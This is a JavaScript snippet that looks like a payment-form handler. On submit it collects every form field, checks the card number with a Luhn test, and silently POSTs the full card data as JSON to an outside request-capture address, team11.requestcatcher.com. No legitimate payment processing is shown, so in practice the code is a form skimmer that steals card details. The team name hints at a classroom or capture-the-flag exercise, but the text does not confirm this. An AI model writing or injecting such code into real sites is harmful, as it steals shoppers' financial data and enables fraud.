const paymentForm = document.getElementById('payment-form');

paymentForm.addEventListener('submit', function(event) {
    event.preventDefault();

    const formData = new FormData(paymentForm);
    const data = Object.fromEntries(formData.entries());

    if (validateLuhn(data.cardNumber)) {
        fetch('https://team11.requestcatcher.com/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
    }
});
